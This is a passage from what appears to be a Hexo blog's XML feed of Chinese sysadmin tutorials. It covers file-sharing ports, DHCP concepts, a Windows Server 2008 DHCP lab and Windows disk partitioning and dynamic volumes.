Sharing</code>，属于TCP协议端口，通过这个端口进入的连接试图获得<code>NetBIOS/SMB</code>服务，有了他们，共享才能最终实现。这个协议被用于Windows”文件和打印机共享”和SAMBA，这里想必大家都知道<code>ipc$</code>，就是用的139，445端口，<code>net use</code>和<code>net view</code>就是去连接对端的139，445端口。访问共享的时候都是优先访问对方的445端口，因为这个就是TCP/IP 上的NetBIOS，有了他就能跨路由/网段访问共享，如果445端口无响应，则访问139端口，这个就是早期的NetBIOS，是无法跨路由的共享。</p></li><li><p>总结：一共需要的端口是UDP的137，138，TCP的139，445。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件共享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP服务</title>
      <link href="/2020/11/09/dhcp-fu-wu/"/>
      <url>/2020/11/09/dhcp-fu-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="DHCP的概述"><a href="#DHCP的概述" class="headerlink" title="DHCP的概述"></a>DHCP的概述</h1><p>​        DHCP（<code>Dynamic Host Configuration Protocol</code>，动态主机配置协议）是由IETF（Internet工作任务小组）设计开发的，专门用于为TCP/IP网络中的计算机自动分配TCP/IP参数的协议。为网络中计算机自动分配TCP/IP参数的协议。</p><p>​        DHCP提供的TCP/IP配置：</p><ul><li>IP地址</li><li>子网掩码</li><li>网关</li><li>DNS</li></ul><h1 id="DHCP的优点"><a href="#DHCP的优点" class="headerlink" title="DHCP的优点"></a>DHCP的优点</h1><ol><li>减少管理员的工作量</li><li>避免输入错误的可能</li><li>避免IP冲突</li><li>提高了IP地址的利用率</li><li>方便客户端的配置</li></ol><h1 id="DHCP工作原理"><a href="#DHCP工作原理" class="headerlink" title="DHCP工作原理"></a>DHCP工作原理</h1><h2 id="DHCP的分配方式"><a href="#DHCP的分配方式" class="headerlink" title="DHCP的分配方式"></a>DHCP的分配方式</h2><ol><li>自动分配<br>分配到一个IP地址后永久使用</li><li>手动分配<br>由DHCP服务器管理员专门指定IP地址</li><li>动态分配<br>使用完后释放该IP，供其它客户机使用</li></ol><h2 id="DHCP租约过程-四个阶段"><a href="#DHCP租约过程-四个阶段" class="headerlink" title="DHCP租约过程(四个阶段)"></a>DHCP租约过程(四个阶段)</h2><p>​        DHCP用的端号是<code>UDP67</code>和<code>UDP68</code>，这两个端口是正常的DHCP服务端口，你可以理解为一个发送，一个接收。客户端从68端口（bootps）广播请求配置，服务器从67端口（bootpc）广播回应请求。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCP/DHCP租约过程.png" alt="DHCP租约过程"></center><ol><li><p>发现阶段，即DHCP客户端寻找DHCP服务器的阶段</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCP/发现阶段.png" alt="发现阶段"></center><p>在发现阶段， DHCP 客户端通过发送 <code>DHCP DISCOVER</code> 报文来寻找 DHCP 服务器。由于 DHCP 服务器的 IP 地址对于客户端来说是未知的，所以 DHCP 客户端以<strong>广播方式</strong>发送<code>DHCP DISCOVER</code>报文。所有收到<code>DHCP DISCOVER</code>报文的 DHCP 服务器都会发送回应报文， DHCP 客户端据此可以知道网络中存在的 DHCP 服务器的位置。</p></li><li><p>提供阶段，即 DHCP 服务器提供 IP 地址的阶段</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCP/提供阶段.png" alt="提供阶段"></center><p>网络中接收到<code>DHCP DISCOVER</code>报文的 DHCP 服务器，会从地址池选择一个合适的<strong>IP 地址</strong>，连同 <strong>IP 地址租约期限和其他配置信息（如网关地址、域名服务器地址等）</strong>通过<code>DHCP OFFER</code>报文发送给 DHCP 客户端。</p></li><li><p>选择阶段，即 DHCP 客户端选择 IP 地址的阶段</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCP/选择阶段.png" alt="选择阶段"></center><p>如果有多台 DHCP 服务器向 DHCP 客户端回应 DHCP OFFER 报文，则 DHCP 客户端只接受第一个收到的 DHCP OFFER 报文。然后以广播方式发送 DHCP REQUEST 请求报文，该报文中包含 Option54（服务器标识选项），即它选择的 DHCP 服务器的IP 地址信息。</p><p>以广播方式发送 DHCP REQUEST 请求报文，是为了通知所有的 DHCP 服务器，它将选择 Option54 中标识的 DHCP 服务器提供的 IP 地址，其他 DHCP 服务器可以重新使用曾提供的 IP 地址</p></li><li><p>确认阶段，即 DHCP 服务器确认所提供 IP 地址的阶段。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCP/确认阶段.png" alt="确认阶段"></center><ul><li><p>当 DHCP 服务器收到 DHCP 客户端回答的 DHCP REQUEST 报文后， DHCP 服务器会根据 DHCP REQUEST 报文中携带的 MAC 地址来查找有没有相应的租约记录。如果有，则向客户端发送包含它所提供的 IP 地址和其它设置的 DHCP ACK 确认报文。</p></li><li><p>DHCP 客户端收到该确认报文后，会以广播的方式发送免费 ARP 报文，探测是否有主机使用服务器分配的 IP 地址，如果在规定的时间内没有收到回应，客户端才使用此地址。</p></li><li><p>如果 DHCP 服务器收到 DHCP REQUEST 报文后，没有找到相应的租约记录，或者由于某些原因无法正常分配 IP 地址，则发送 DHCP NAK 报文作为应答，通知 DHCP客户端无法分配合适 IP 地址。DHCP 客户端需要重新发送 DHCP DISCOVER 报文来申请新的 IP 地址。</p></li><li><p>DHCP Client 获得 IP 地址后，上线之前会检测正在使用的网关的状态，如果网关地址错误或网关设备故障， DHCP 客户端将重新使用四步交互方式请求新的 IP 地址</p></li></ul></li></ol><h2 id="客户端重启"><a href="#客户端重启" class="headerlink" title="客户端重启"></a>客户端重启</h2><ol><li>发送带有IP地址的DHCP Request请求包</li><li>IP地址没有分配使用，发送DHCP ACK确认信息<ul><li>客户端继续使用重启前的IP地址</li></ul></li><li>IP地址分配到其他客户机使用<ul><li>发送DHCP Nak否认信息    </li><li>客户机重新发送DHCP Discover</li></ul></li></ol><h2 id="更新租约"><a href="#更新租约" class="headerlink" title="更新租约"></a>更新租约</h2><table><thead><tr><th>定时器</th><th>默认值</th></tr></thead><tbody><tr><td>租期更新</td><td>总租期的50%</td></tr><tr><td>重绑定</td><td>总租期的87.5%</td></tr><tr><td>到达租期</td><td>总租期</td></tr></tbody></table><p>DHCP 客户端更新租约，主要通过以下几个步骤与 DHCP 服务器建立联系</p><ol><li>IP 租约期限达到 50%（T1）时， DHCP 客户端会自动以单播的方式，向 DHCP 服务器发送 DHCP REQUEST 报文，请求更新 IP 地址租约。如果收到 DHCP ACK 报文，则租约更新成功；如果收到 DHCP NAK 报文，则重新发起申请过程。</li><li>IP 租约期限达到 87.5%（T2）时，如果仍未收到 DHCP 服务器的应答， DHCP 客户端会自动向 DHCP 服务器发送更新其 IP 租约的广播报文。如果收到 DHCP ACK 报文，则租约更新成功；如果收到 DHCP NAK 报文，则重新发起申请过程</li><li>如果 IP 租约到期前都没有收到服务器响应，客户端停止使用此 IP 地址，重新发送DHCP DISCOVER 报文请求新的 IP 地址。</li><li>如果服务器依然没有回应，计算机会自动配置169.254.x.x</li></ol><h1 id="配置DHCP服务器"><a href="#配置DHCP服务器" class="headerlink" title="配置DHCP服务器"></a>配置DHCP服务器</h1><h2 id="安装DHCP的规划"><a href="#安装DHCP的规划" class="headerlink" title="安装DHCP的规划"></a>安装DHCP的规划</h2><ol><li>服务器规划一个静态IP地址</li><li>确定DHCP服务器分发给客户机的IP地址范围</li><li>为客户机确定正确的子网掩码</li><li>确定DHCP服务器不向客户机分发的IP地址</li><li>决定IP地址的租用期限（建议时间不要太长，因为通常不能获取ip，除了dhcp服务器出问题外，就是ip不够用了，也就是没有及时释放原来的ip地址。）</li></ol><p><font color="blue">更加详细的DHCP配置前参考<a href="https://z1r0s.github.io/2020/11/09/shi-yong-windowsserver-da-jian-dhcp-fu-wu-qi/">使用WindowsServer搭建DHCP服务器</a></font></p><h2 id="授权DHCP"><a href="#授权DHCP" class="headerlink" title="授权DHCP"></a>授权DHCP</h2><p>授权是一种安全预防措施</p><ol><li>安装过程为DHCP服务器授权</li><li>使用DHCP控制台为服务器授权</li><li>为DHCP服务器授权需要有<strong>企业管理员权限</strong></li></ol><h2 id="管理作用域"><a href="#管理作用域" class="headerlink" title="管理作用域"></a>管理作用域</h2><ol><li>DHCP作用域是一段IP地址范围</li><li>作用域属性:<ul><li>IP地址范围</li><li>子网掩码，用来确定给定IP地址的子网</li><li>作用域名称，在创建作用域时指定该名称</li><li>租用期限值</li><li>保留IP地址，确保客户机始终获取相同IP地址</li></ul></li></ol><h1 id="配置DHCP客户端"><a href="#配置DHCP客户端" class="headerlink" title="配置DHCP客户端"></a>配置DHCP客户端</h1><ol><li>将客户端的网卡信息改为自动获取（虚拟机确保关闭虚拟网卡的DHCP）</li><li>查看dhcp的信息（ipconfig 详细信息：<code>ipconfig /all</code>）</li><li>释放IP<br><code>ipconfig /release  (windows系统)</code></li><li>重新获取<br><code>ipconfig /renew (windows系统)</code></li></ol><h1 id="维护DHCP服务"><a href="#维护DHCP服务" class="headerlink" title="维护DHCP服务"></a>维护DHCP服务</h1><h2 id="备份DHCP数据库"><a href="#备份DHCP数据库" class="headerlink" title="备份DHCP数据库"></a>备份DHCP数据库</h2><ol><li><p>服务器管理器 → 角色 → DHCP服务器 → win-h69v7ls7q7d → 右键选择【备份…】选项，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCP/备份DHCP服务配置.png" alt="备份DHCP服务配置"></center></li><li><p>备份位置如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCP/备份位置.png" alt="备份位置"></center></li></ol><h2 id="还原DHCP数据库"><a href="#还原DHCP数据库" class="headerlink" title="还原DHCP数据库"></a>还原DHCP数据库</h2><ol><li><p>服务器管理器 → 角色 → DHCP服务器 → win-h69v7ls7q7d → 右键选择【还原…】选项，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCP/还原配置.png" alt="还原配置"></center></li><li><p>DHCP服务器配置还原结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCP/还原结果.png" alt="还原结果"></center></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DHCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用WindowsServer搭建DHCP服务器</title>
      <link href="/2020/11/09/shi-yong-windowsserver-da-jian-dhcp-fu-wu-qi/"/>
      <url>/2020/11/09/shi-yong-windowsserver-da-jian-dhcp-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-实验描述"><a href="#0x01-实验描述" class="headerlink" title="0x01 实验描述"></a>0x01 实验描述</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/DHCP服务器实验图.png" alt="DHCP服务器实验图"></center><p>​        在VMware中开启三台虚拟机，其中Windows Server 2008一台命名为DHCP Server作为DHCP服务器使用，Windows 7两台分别命名为PC1和PC2作为DHCP客户端使用。DHCP Server拥有两张网卡一张为NAT模式、一张为仅主机模式，两张网卡配置如上图所示。要求PC1和PC2通过DHCP Server获取IP信息，且分配完毕后可以正常访问网络。</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>DHCP服务器：Windows Server 2008 R2（两块网卡）</li><li>DHCP客户机：Windows 7（两台）</li></ul><h1 id="0x03-实验准备"><a href="#0x03-实验准备" class="headerlink" title="0x03 实验准备"></a>0x03 实验准备</h1><ol><li><p>添加名为VMnet9类型为仅主机模式的的网卡，关闭DHCP功能，并设置IP网段为：<code>10.10.11.0</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/虚拟网络编辑器设置.gif" alt="虚拟网络编辑器设置"></center></li><li><p>为Windows Server添加一张新网络适配器，并设置联网模式如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/新网卡设置.png" alt="新网卡设置"></center></li></ol><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><h2 id="DHCP服务安装"><a href="#DHCP服务安装" class="headerlink" title="DHCP服务安装"></a>DHCP服务安装</h2><ol><li><p>打开【服务器管理器】界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/服务器管理器.png" alt="服务器管理器"></center></li><li><p>点击【添加角色】选项，打开添加角色向导界面，结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/添加角色向导界面.png" alt="添加角色向导界面"></center></li><li><p>点击【下一步】按钮，进入服务器角色先择界面，选择DHCP服务器（若出现弹框则强制安装）。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/添加服务器角色.png" alt="添加服务器角色"></center></li><li><p>点击【下一步】按钮后在DHCP服务器简介界面点击【下一步】按钮进入IPv4 DNS 设置界面，这里不做任何设置，直接点击【下一步】即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/DNS服务器设置.png" alt="DNS服务器设置"></center></li><li><p>在WINS设置界面中选择【此网络上的应用程序不需要WINS】，结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/WINS设置.png" alt="WINS设置"></center></li><li><p>点击【下一步】按钮后进入DHCP作用域设置界面，此处不做设置直接点击下一步按钮即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/DHCP作用域设置.png" alt="DHCP作用域设置"></center></li><li><p>点击【下一步】按钮后进入DHCPv6无状态模式界面，此处勾选禁用DHCPv6无状态模式，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/DHCPv6无状态模式设置.png" alt="DHCPv6无状态模式设置"></center></li><li><p>点击【下一步】按钮，显示安装确认界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/确认安装界面.png" alt="确认安装界面"></center></li><li><p>点击【安装】按钮即可开始安装DHCP服务，等待少许显示如下图所示结果表示DHCP服务已安装成功。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/DHCP服务安装成功.png" alt="DHCP服务安装成功"></center></li></ol><h2 id="静态IP设置"><a href="#静态IP设置" class="headerlink" title="静态IP设置"></a>静态IP设置</h2><ol><li><p>设置NAT模式联网网卡的IP信息如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/设置静态IP.png" alt="设置静态IP"></center></li><li><p>设置仅主机联网的网卡的IP信息如下图所示，</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/仅主机模式网卡IP设置.png" alt="仅主机模式网卡IP设置"></center></li></ol><h2 id="设置NAT网卡的作用域"><a href="#设置NAT网卡的作用域" class="headerlink" title="设置NAT网卡的作用域"></a>设置NAT网卡的作用域</h2><ol><li><p>服务器管理器 → 角色 → DHCP服务器 → win-h69v7ls7q7d → IPv4 → 右键【新建作用域…】打开新建作用域向导界面，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/新建作用域向导.png" alt="新建作用域向导"></center></li><li><p>点击【下一步】按钮后进入作用域名称设置界面，设置名称为Demo，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/作用域名称设置界面.png" alt="作用域名称设置界面"></center></li><li><p>点击【下一步】按钮进入IP地址范围设置界面，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/IP地址范围设置界面.png" alt="IP地址范围设置界面"></center></li><li><p>点击【下一步】按钮，进入添加排除和延迟界面，由于此题设置不需要设置任何选项，直接单击【下一步】按钮即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/添加排除和延迟界面.png" alt="添加排除和延迟界面"></center></li><li><p>点击【下一步】按钮进入租用期限设置界面，设置租用期限为8天，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/租用期限设置.png" alt="租用期限设置"></center></li><li><p>点击【下一步】按钮后进入配置DHCP选项界面，这里选择稍后配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/配置DHCP选项界面.png" alt="配置DHCP选项界面"></center></li><li><p>点击【下一步】按钮进入如下所示界面，点击【完成】按钮后作用域新建完成。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/完成新建作用域向导.png" alt="完成新建作用域向导"></center></li><li><p>作用域新建完成之后需要继续配置作用域选项，如下图可配置路由器选项。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/路由器配置选项.png" alt="路由器配置选项"></center></li><li><p>路由器选项设置完成之后还需要设置DNS选项，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/DNS服务器选项设置.png" alt="DNS服务器选项设置"></center></li><li><p><font color="red">所有设置完成之后记得右键作用域并将其激活。</font></p></li></ol><h2 id="设置仅主机模式网卡作用域"><a href="#设置仅主机模式网卡作用域" class="headerlink" title="设置仅主机模式网卡作用域"></a>设置仅主机模式网卡作用域</h2><ol><li><p>服务器管理器 → 角色 → DHCP服务器 → win-h69v7ls7q7d → IPv4 → 右键【新建作用域…】打开新建作用域向导界面，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/新建作用域向导1.png" alt="新建作用域向导"></center></li><li><p>点击【下一步】按钮后进入作用域名称设置界面，设置名称为Only，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/作用域名称设置1.png" alt="作用域名称设置"></center></li><li><p>点击【下一步】按钮进入IP地址范围设置界面，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/IP地址范围设置1.png" alt="IP地址范围设置"></center></li><li><p>点击【下一步】按钮，进入添加排除和延迟界面，由于此题设置不需要设置任何选项，直接单击【下一步】按钮即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/添加排除和延迟界面.png" alt="添加排除和延迟界面"></center></li><li><p>点击【下一步】按钮进入租用期限设置界面，设置租用期限为8天，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/租用期限设置.png" alt="租用期限设置"></center></li><li><p>点击【下一步】按钮后进入配置DHCP选项界面，这里选择稍后配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/配置DHCP选项界面.png" alt="配置DHCP选项界面"></center></li><li><p>点击【下一步】按钮进入如下所示界面，点击【完成】按钮后作用域新建完成。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/完成新建作用域向导.png" alt="完成新建作用域向导"></center></li><li><p><font color="red">在仅主机模式中虚拟机与VMnet9形成一个小局域网，且不能连接外网，所以此处不必做路由器和DNS服务器选项配置，直接右键作用域并将其激活。</font></p></li></ol><h1 id="0x04-实验结果"><a href="#0x04-实验结果" class="headerlink" title="0x04 实验结果"></a>0x04 实验结果</h1><ol><li><p>PC1获得的动态IP如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/PC1IP地址.png" alt="PC1IP地址"></center></li><li><p>网络访问效果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/网络访问.png" alt="网络访问"></center></li><li><p>PC获得的动态IP如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/PC2IP地址.png" alt="PC2IP地址"></center></li><li><p>PC2的网络检测结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DHCPServerDemo1/PC2网络检测.png" alt="PC2网络检测"></center></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li>此实验涉及两种网络，以NAT方式接入互联网的局域网和未接入互联网的局域网。</li><li>客户端更新租期的常用名为：<ul><li><code>ipconfig /release</code></li><li><code>ipconfig /renew</code></li></ul></li><li>DHCP客户机想要连接互联网必须配置有效的网关和DNS信息。</li><li>有关DHCP服务刚详细的内容可查看<a href="https://z1r0s.github.io/2020/11/09/dhcp-fu-wu/">DHCP服务</a>。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DHCP </tag>
            
            <tag> WindowsServer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows磁盘管理</title>
      <link href="/2020/11/07/windows-ci-pan-guan-li/"/>
      <url>/2020/11/07/windows-ci-pan-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-磁盘管理概述"><a href="#0x01-磁盘管理概述" class="headerlink" title="0x01 磁盘管理概述"></a>0x01 磁盘管理概述</h1><p>​        磁盘管理是一项计算机使用时的常规任务，它是以一组磁盘管理应用程序的形式提供给用户的，他们位于计算机管理控制台中，它包括<strong>查错程序</strong>和<strong>磁盘碎片整理程序</strong>以及<strong>磁盘整理程序</strong>。（来源<a href="https://baike.baidu.com/item/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/9140310?fr=aladdin#1" target="_blank" rel="noopener">百度百科</a>）本文主要介绍的内容为磁盘整理程序中的分区管理。</p><h1 id="0x02-磁盘分区方式"><a href="#0x02-磁盘分区方式" class="headerlink" title="0x02 磁盘分区方式"></a>0x02 磁盘分区方式</h1><h2 id="MBR-分区方式（基本）"><a href="#MBR-分区方式（基本）" class="headerlink" title="MBR 分区方式（基本）"></a>MBR 分区方式（基本）</h2><p>​        MBR（<code>Master Boot Record</code>）主引导记录，是传统的分区机制，应用于绝大多数使用BIOS的PC设备。主启动记录存在第一扇区，共512字节，包含引导程序（446字节）和分区表（64字节）；每个分区信息会占16个字节；最多可划分4个主分区；标记（2字节）标记系统分区。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/MBR分区1.png" alt="MBR分区"></center><p><strong>特点</strong>：</p><ol><li>只能管理连续的磁盘空间</li><li>不能提高读写效率</li><li>无可靠性</li><li>MBR支持32位和64位系统</li><li>MBR支持分区数量有限</li><li>MBR只支持不超过2T的硬盘，超过2T的硬盘将只能用2T空间（有第三方解决方法）</li></ol><h2 id="GPT的分区方式（动态）"><a href="#GPT的分区方式（动态）" class="headerlink" title="GPT的分区方式（动态）"></a>GPT的分区方式（动态）</h2><p>​        GPT（<code>GUID Partition Table</code>）全局唯一标识分区表，是一个较新的分区机制，解决了MBR很多缺点，分区表突破64字节；Windows 2008上最多可划分128个主分区。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/GPT分区.png" alt="GPT分区"></center><p><strong>特点</strong>：</p><ol><li>可扩展性    （随时扩展文件系统的管理空间，即分区的容量）</li><li>高读写性    （动态磁盘中卷由多个硬盘组成，提高读写的速率）</li><li>高可靠性     （防止某个硬盘损坏导致数据丢失）</li><li>支持超过2T的磁盘（64位寻址空间）。<code>fdisk</code>最大只能建立2TB大小的分区，创建一个大于2TB的分区使用<code>parted</code></li><li>向后兼容MBR</li><li>必须在支持uEFI的硬件上才能使用（Intel提出，用于取代BIOS）</li><li>必须使用64位系统</li><li><code>Mac</code>、<code>Linux</code>系统都能支持GPT分区格式</li><li><code>Windows 7/8 64bit</code>、<code>Windows Server 2008 64bit</code>支持GPT</li></ol><h1 id="0x03-Windows动态磁盘管理"><a href="#0x03-Windows动态磁盘管理" class="headerlink" title="0x03 Windows动态磁盘管理"></a>0x03 Windows动态磁盘管理</h1><h2 id="新加硬盘建卷过程"><a href="#新加硬盘建卷过程" class="headerlink" title="新加硬盘建卷过程"></a>新加硬盘建卷过程</h2><ol><li><p><strong>联机</strong>。新加的硬盘在磁盘管理器中会以<strong>脱机</strong>状态显示，只有联机硬盘才能初始化使用。右键需要联机的磁盘 → 点击【联机】选项，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/联机磁盘.png" alt="联机磁盘"></center></li><li><p><strong>初始化</strong>。联机磁盘后还需要初始化磁盘，右键需要初始化的磁盘 → 点击【初始化】选项 → 在初始化界面中选择两种分区方式的一种，这里推荐使用GPT方式。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/初始化磁盘.png" alt="初始化磁盘"></center></li><li><p><strong>新建卷</strong>。新建卷的种类有很多这里仅演示简单卷的创建其他卷的创建将在后续章节中演示。右键已初始化的磁盘 → 选择【转换到动态磁盘】选项 → 选中待转化磁盘后点击【确定】按钮 → 右键磁盘选择【新建简单卷】选项 → 打开新建简单卷向导并按照提示操作。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/新建简单卷.gif" alt="新建简单卷"></center></li></ol><h2 id="卷的分类"><a href="#卷的分类" class="headerlink" title="卷的分类"></a>卷的分类</h2><h3 id="简单卷"><a href="#简单卷" class="headerlink" title="简单卷"></a>简单卷</h3><p>​        构成单个物理磁盘空间的卷。它可以由磁盘上的单个区域或同一磁盘上连接在一起的多个区域组成，可以在同一个磁盘内扩展简单卷。</p><h3 id="跨区卷"><a href="#跨区卷" class="headerlink" title="跨区卷"></a>跨区卷</h3><p>​        简单卷也可以扩展到其他的物理磁盘，这样由多个物理磁盘的空间组成的卷就称为跨区卷。简单卷和跨区卷都不属于RAID范畴。</p><h3 id="带区卷"><a href="#带区卷" class="headerlink" title="带区卷"></a>带区卷</h3><p>​        以带区形式在两个或多个物理磁盘上存储数据的卷。带区卷上的数据被交替、平均（以带区形式）地分配给这些磁盘，带区卷是所有Windows 2000可用的卷中性能最佳的，但它不提供容错。如果带区卷上的任何一个磁盘数据损坏或磁盘故障，则整个卷上的数据都将丢失。带区卷可以看作硬件RAID中的RAID0。</p><h3 id="镜像卷"><a href="#镜像卷" class="headerlink" title="镜像卷"></a>镜像卷</h3><p>​        在两个物理磁盘上复制数据的容错卷。它通过使用卷的副本（镜像））复制该卷中的信息来提供数据冗余，镜像总位于另一个磁盘上。如果其中一个物理磁盘出现故障，则该故障磁盘上的数据将不可用，但是系统可以使用未受影响的磁盘继续操作。镜像卷可以看作硬件RAID中的RAID1。</p><h3 id="RAID-5"><a href="#RAID-5" class="headerlink" title="RAID-5"></a>RAID-5</h3><p>​        具有数据和奇偶检验的容错卷，有时分布于三个或更多的物理磁盘，奇偶检验用于在阵列失效后重建数据。如果物理磁盘的某一部分失效，可以用余下的数据和奇偶检验信息重新常见磁盘上失效的那一部分数据，类似硬件RAID中的RAID5，在硬件IDE RAID中，RAID5是很少键的，通常在SCSI RAID卡和高档的IDE RAID卡中才能提供，普通IDE RAID卡仅提供RAID0、RAID1和TAID0+1。</p><p><strong>总结</strong>：</p><center><b>各种卷特点对比</b></center><table><thead><tr><th align="center">卷类型</th><th align="center">需要磁盘数量</th><th align="center">空间是否一致</th><th>可扩展性</th><th>读写性能</th><th>容错</th><th align="center">空间利用率</th></tr></thead><tbody><tr><td align="center">简单卷</td><td align="center"><code>1</code></td><td align="center">否</td><td>可扩展</td><td>正常读写</td><td>无</td><td align="center">100%</td></tr><tr><td align="center">跨区卷</td><td align="center"><code>2-32</code></td><td align="center">否</td><td>可扩展</td><td>正常读写</td><td>无</td><td align="center">100%</td></tr><tr><td align="center">带区卷</td><td align="center"><code>2-32</code></td><td align="center">是</td><td>不可扩展</td><td>多盘同读（最快）</td><td>无</td><td align="center">100%</td></tr><tr><td align="center">镜像卷</td><td align="center"><code>2</code></td><td align="center">是</td><td>不可扩展</td><td>正常读写</td><td>有</td><td align="center">50%</td></tr><tr><td align="center">RAID-5</td><td align="center"><code>3-32</code></td><td align="center">是</td><td>不可扩展</td><td>多盘同读（较快）</td><td>有</td><td align="center">n-1（n=磁盘数量）</td></tr></tbody></table><h2 id="卷的管理"><a href="#卷的管理" class="headerlink" title="卷的管理"></a>卷的管理</h2><p>​        卷的管理主要包括新建卷、扩展卷、压缩卷、添加镜像、删除镜像、中断镜像等操作。</p><h3 id="简单卷管理"><a href="#简单卷管理" class="headerlink" title="简单卷管理"></a>简单卷管理</h3><h4 id="新建简单卷"><a href="#新建简单卷" class="headerlink" title="新建简单卷"></a>新建简单卷</h4><ol><li><p>在想要创建简单卷的磁盘上右键点击【新建简单卷】选项后打开新建简单卷向导，操作结果如下图所示。</p><center><img 